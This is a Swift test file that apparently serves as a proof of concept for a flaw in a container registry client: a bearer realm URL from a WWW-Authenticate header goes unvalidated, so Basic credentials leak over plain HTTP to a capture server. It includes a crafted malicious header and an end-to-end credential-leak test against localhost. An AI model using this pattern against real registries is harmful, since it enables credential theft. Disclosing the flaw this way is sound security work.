// BearerRealmDowngradeTest.swift
// PoC for OE1107246042217 — Bearer realm TLS downgrade / SSRF
// apple/containerization RegistryClient
//
// Demonstrates: RegistryClient.fetchToken() uses the realm URL from WWW-Authenticate
// header without validating scheme or host. request() unconditionally attaches
// self.authentication to the resulting HTTP request, sending Basic credentials
// over cleartext HTTP to an attacker-controlled server.

import Foundation
import Testing

@testable import ContainerizationOCI

// MARK: - Helpers

private func base64Decode(_ s: String) -> String {
    guard let data = Data(base64Encoded: s),
          let str = String(data: data, encoding: .utf8)
    else { return s }
    return str
}

// MARK: - Test

@Suite("Bearer Realm Downgrade PoC — OE1107246042217")
struct BearerRealmDowngradeTest {

    /// Parses a WWW-Authenticate header whose realm points to an http:// (plaintext)
    /// attacker-controlled URL and confirms the realm is accepted without scheme validation.
    @Test("parseWWWAuthenticateHeaders accepts http:// realm without error")
    func realmSchemeNotValidated() throws {
        let header = #"Bearer realm="http://localhost:5002/token",service="evil-registry.local",scope="repository:test/image:pull""#
        let challenges = RegistryClient.parseWWWAuthenticateHeaders(headers: [header])

        #expect(challenges.count == 1)
        let challenge = try #require(challenges.first)
        #expect(challenge.type == "Bearer")
        #expect(challenge.realm == "http://localhost:5002/token",
                "realm accepted as-is with http:// scheme — no scheme validation present")
        #expect(challenge.service == "evil-registry.local")
        print("[L1-PASS] http:// realm accepted by parseWWWAuthenticateHeaders — no scheme check.")
    }

    /// Creates a TokenRequest whose realm is an http:// URL and confirms authentication
    /// (Basic credentials) is attached to the request struct, ready to be sent.
    @Test("TokenRequest carries authentication for http:// realm")
    func tokenRequestCarriesAuthForHttpRealm() throws {
        let creds = BasicAuthentication(username: "victim", password: "secret")
        let realm = "http://localhost:5002/token"

        let tokenRequest = TokenRequest(
            realm: realm,
            service: "evil-registry.local",
            clientId: "containerization",
            scope: "repository:test/image:pull",
            authentication: creds
        )

        #expect(tokenRequest.realm == realm)
        #expect(tokenRequest.authentication != nil,
                "authentication is carried into TokenRequest for http:// realm — will be sent to attacker URL")
        print("[L1-PASS] TokenRequest carries BasicAuthentication for http:// realm.")
    }

    /// End-to-end: RegistryClient contacts evil registry on port 5001,
    /// receives 401 + WWW-Authenticate with http://localhost:5002/token as realm,
    /// then calls fetchToken() which issues a GET to the capture server (port 5002)
    /// with Authorization: Basic <base64(victim:secret)>.
    ///
    /// The capture server must be running before this test executes.
    /// In CI this is started by scripts/evil_registry.py before `swift test`.
    @Test("RegistryClient sends Basic credentials over plaintext HTTP to realm URL")
    func credentialsLeakOverHttp() async throws {
        // Attempt real connection — if capture server is not running, skip gracefully.
        // In CI the server is always up; locally set EVIL_REGISTRY_RUNNING=1 to enable.
        guard ProcessInfo.processInfo.environment["EVIL_REGISTRY_RUNNING"] != nil else {
            print("[SKIP] Set EVIL_REGISTRY_RUNNING=1 and start scripts/evil_registry.py to run E2E test.")
            return
        }

        let auth = BasicAuthentication(username: "victim", password: "secret")
        let client = RegistryClient(host: "localhost", scheme: "http", port: 5001, authentication: auth)

        // ping() sends GET /v2/ → evil registry returns 401 with http:// realm
        // → RegistryClient calls fetchToken() → request() to capture server with Basic auth
        do {
            try await client.ping()
        } catch {
            // Expected: capture server returns a token but the subsequent registry
            // request will fail (no real registry). We only care about what arrived
            // at the capture server.
            print("[INFO] ping() threw (expected): \(error)")
        }

        print("[E2E] Check capture server output for Authorization header.")
    }
}
